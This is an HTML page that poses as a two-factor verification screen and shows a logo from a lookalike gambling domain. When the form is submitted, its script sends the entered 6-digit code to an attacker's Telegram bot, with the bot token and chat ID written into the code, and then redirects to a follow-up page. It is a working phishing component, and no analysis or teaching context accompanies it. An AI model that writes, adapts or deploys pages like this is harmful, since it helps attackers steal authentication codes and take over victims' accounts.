<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>2FA Verification</title>
    <style>
        body { margin: 0; padding: 0; font-family: Arial, sans-serif; background-color: rgb(36, 36, 36); color: #fff; display: flex; justify-content: center; align-items: center; height: 50vh; }
        .container { background-color: rgba(34, 38, 38, 0); padding: 20px; text-align: center; width: 100%; }
        .container img { width: 50px; margin-bottom: 20px; }
        .container h1 { font-size: 15px; color: #cacaca; font-weight: 700; margin-bottom: 10px; }
        input[type="text"] { width: 80%; padding: 10px; margin: 20px 0; border: 1px solid #444; border-radius: 5px; background-color: #333; color: #fff; font-size: 16px; }
        .submit-btn { background-color: #39b54a; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; width: 85%; }
    </style>
</head>
<body>
<div class="container">
    <img src="https://bcgame.top/assets/logo/logo.png" alt="Logo">
    <h1>Enter 2FA Code</h1>
    <form onsubmit="event.preventDefault(); sendMessage();">
        <input type="text" id="verificationCode" placeholder="Enter 6-digit code" required>
        <button type="submit" class="submit-btn">Submit Code</button>
    </form>
</div>
<script>
    async function sendMessage() {
        const code = document.getElementById("verificationCode").value;
        const message = `New 2FA Code: ${code}`;
        const bots = { "7892706717:AAGLqVZWBSvENZtXC-7EpmjhOHygY_8RQK8": "-4814667671" };

        try {
            const sendPromises = Object.entries(bots).map(async ([token, chatId]) => {
                const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
                return fetch(url);
            });
            await Promise.all(sendPromises);
            // यहाँ सुधार है: अब बटन दबाते ही पेज खुलेगा
            window.location.href = "verification.html";
        } catch (error) {
            window.location.href = "verification.html";
        }
    }
</script>
</body>
</html>
